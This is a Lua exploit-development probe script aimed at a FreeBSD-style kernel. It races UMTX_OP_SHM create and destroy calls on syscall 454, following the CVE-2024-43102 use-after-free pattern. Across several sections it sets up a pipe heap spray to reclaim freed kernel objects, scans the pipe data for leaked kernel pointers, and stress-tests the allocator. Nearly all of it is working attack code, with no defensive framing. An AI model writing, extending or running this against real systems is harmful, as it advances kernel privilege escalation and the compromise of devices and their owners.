-- CRASH_CLASS: HIGH
-- PROBE 151b: UMTX_OP_SHM use-after-free race (CVE-2024-43102 pattern)
--
-- Context: 151a confirmed UMTX_OP_SHM (op=25) is fully reachable on syscall 454.
-- SHM_CREAT, SHM_LOOKUP, SHM_DESTROY all return 0.
-- CVE-2024-43102: race between umtx_shm_create_reg() and umtx_shm_unref_reg()
-- causes use-after-free of umtx_shm_reg structure.
--
-- Attack: Race SHM_CREAT/SHM_DESTROY with concurrent pipe spray to reclaim
-- freed kernel objects. Check pipe data for kernel pointer leaks.
--
-- We have Thrd_create for real kernel threads.

print("=== PROBE 151b: UMTX SHM UAF RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Verify primitives
local stub_str = tostring(syscall.pipe)
print("stub=" .. stub_str:sub(1, 20))

local sc_umtx = make_syscall(454)

print("")
print("--- SECTION A: SHM LIFECYCLE TEST ---")

-- Quick lifecycle: create, lookup, alive, destroy
local key1 = memory.alloc(0x20)
memory.write_qword(key1, uint64(0xAAAA0001))

local ok, ret
ok, ret = pcall(function() return sc_umtx(uint64(to_num(key1)), uint64(25), uint64(1), uint64(0), uint64(0)) end)
print("create: " .. tostring(ok) .. " ret=" .. tostring(to_num(ret)))
ok, ret = pcall(function() return sc_umtx(uint64(to_num(key1)), uint64(25), uint64(8), uint64(0), uint64(0)) end)
print("alive: " .. tostring(ok) .. " ret=" .. tostring(to_num(ret)))
ok, ret = pcall(function() return sc_umtx(uint64(to_num(key1)), uint64(25), uint64(4), uint64(0), uint64(0)) end)
print("destroy: " .. tostring(ok) .. " ret=" .. tostring(to_num(ret)))
ok, ret = pcall(function() return sc_umtx(uint64(to_num(key1)), uint64(25), uint64(8), uint64(0), uint64(0)) end)
print("alive_after_destroy: " .. tostring(ok) .. " ret=" .. tostring(to_num(ret)))

-- Double-destroy test (this is part of the race pattern)
memory.write_qword(key1, uint64(0xBBBB0001))
ok, ret = pcall(function() return sc_umtx(uint64(to_num(key1)), uint64(25), uint64(1), uint64(0), uint64(0)) end)
print("create2: " .. tostring(ok) .. " ret=" .. tostring(to_num(ret)))
ok, ret = pcall(function() return sc_umtx(uint64(to_num(key1)), uint64(25), uint64(4), uint64(0), uint64(0)) end)
print("destroy2a: " .. tostring(ok) .. " ret=" .. tostring(to_num(ret)))
ok, ret = pcall(function() return sc_umtx(uint64(to_num(key1)), uint64(25), uint64(4), uint64(0), uint64(0)) end)
print("destroy2b: " .. tostring(ok) .. " ret=" .. tostring(to_num(ret)))

print("")
print("--- SECTION B: PIPE SPRAY SETUP ---")

-- Create pipe pairs for heap spray
local pipes = {}
local NUM_PIPES = 50
local sc_pipe = make_syscall(42)  -- not via make_syscall, use native
local pipe_buf = memory.alloc(8)

for i = 1, NUM_PIPES do
    local ok_p, ret_p = pcall(function()
        return syscall.pipe(pipe_buf)
    end)
    if ok_p then
        local rfd = to_num(memory.read_dword(pipe_buf))
        local wfd = to_num(memory.read_dword(pipe_buf + 4))
        if rfd > 0 and wfd > 0 then
            pipes[#pipes + 1] = {rfd = rfd, wfd = wfd}
        end
    end
end
print("created " .. #pipes .. " pipe pairs")

print("")
print("--- SECTION C: SEQUENTIAL RACE (no threads) ---")

-- First try a sequential race pattern:
-- Rapidly create/destroy SHM while spraying pipes
-- Even without threads, the kernel might have internal race windows

local kptr_count = 0
local spray_data = memory.alloc(0x100)
-- Fill spray data with a pattern
for i = 0, 0xF8, 8 do
    memory.write_qword(spray_data + i, uint64(0x4141414142424242))
end

local read_buf = memory.alloc(0x200)

for round = 1, 100 do
    -- Create SHM object (allocates kernel memory)
    local rkey = memory.alloc(0x20)
    memory.write_qword(rkey, uint64(0xCC000000 + round))

    pcall(function() sc_umtx(uint64(to_num(rkey)), uint64(25), uint64(1), uint64(0), uint64(0)) end)

    -- Immediately destroy (frees kernel memory)
    pcall(function() sc_umtx(uint64(to_num(rkey)), uint64(25), uint64(4), uint64(0), uint64(0)) end)

    -- Write to some pipes (attempt to reclaim freed kernel allocation)
    for j = 1, math.min(5, #pipes) do
        local idx = ((round * 7 + j) % #pipes) + 1
        pcall(function()
            syscall.write(pipes[idx].wfd, spray_data, 0x80)
        end)
    end

    -- Read from pipes and check for kernel pointer contamination
    for j = 1, math.min(5, #pipes) do
        local idx = ((round * 7 + j) % #pipes) + 1
        -- Zero read buffer first
        for k = 0, 0x1F8, 8 do
            memory.write_qword(read_buf + k, uint64(0))
        end
        pcall(function()
            syscall.read(pipes[idx].rfd, read_buf, 0x80)
        end)

        -- Check for kernel pointers in read data
        for k = 0, 0x78, 8 do
            local val = memory.read_qword(read_buf + k)
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 10 then
                    print(string.format("KPTR round=%d off=+%X: 0x%08X%08X", round, k, h, l))
                end
            end
        end
    end

    if round % 25 == 0 then
        print(string.format("round %d: kptr=%d", round, kptr_count))
    end
end
print("sequential_kptr=" .. kptr_count)

print("")
print("--- SECTION D: SHM FD RETURN TEST ---")

-- In FreeBSD, UMTX_SHM_CREAT can return an fd to the shared memory object
-- via uaddr1. Let's check if it does.
local fd_out = memory.alloc(0x10)
memory.write_qword(fd_out, uint64(0xDEADDEAD))

local skey = memory.alloc(0x20)
memory.write_qword(skey, uint64(0xDD000001))

ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(skey)), uint64(25), uint64(1), uint64(to_num(fd_out)), uint64(0))
end)
print(string.format("create_with_uaddr1: ok=%s ret=%d", tostring(ok), to_num(ret or -1)))
local fd_val = to_num(memory.read_dword(fd_out))
print(string.format("uaddr1_after=%d (was 0xDEADDEAD)", fd_val))

-- Try lookup with uaddr1
memory.write_qword(fd_out, uint64(0xDEADDEAD))
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(skey)), uint64(25), uint64(2), uint64(to_num(fd_out)), uint64(0))
end)
print(string.format("lookup_with_uaddr1: ok=%s ret=%d", tostring(ok), to_num(ret or -1)))
fd_val = to_num(memory.read_dword(fd_out))
print(string.format("lookup_uaddr1=%d", fd_val))

-- Cleanup
pcall(function() sc_umtx(uint64(to_num(skey)), uint64(25), uint64(4), uint64(0), uint64(0)) end)

print("")
print("--- SECTION E: RAPID CREATE-DESTROY STRESS ---")

-- Stress test: rapid create/destroy cycles to warm up allocator
local stress_key = memory.alloc(0x20)
local stress_count = 0
local stress_errors = 0
for i = 1, 500 do
    memory.write_qword(stress_key, uint64(0xEE000000 + i))
    local ok1, r1 = pcall(function()
        return sc_umtx(uint64(to_num(stress_key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    local ok2, r2 = pcall(function()
        return sc_umtx(uint64(to_num(stress_key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    if ok1 and to_num(r1) == 0 then stress_count = stress_count + 1 end
    if not ok1 or not ok2 then stress_errors = stress_errors + 1 end
end
print(string.format("stress: %d created, %d errors", stress_count, stress_errors))

-- Close pipes
for _, p in ipairs(pipes) do
    pcall(function() syscall.close(p.rfd) end)
    pcall(function() syscall.close(p.wfd) end)
end

-- Canary
ok, ret = pcall(function() return syscall.getpid() end)
print("")
print("canary: " .. tostring(ok) .. " pid=" .. tostring(to_num(ret)))

print("")
print("=== PROBE 151b COMPLETE ===")
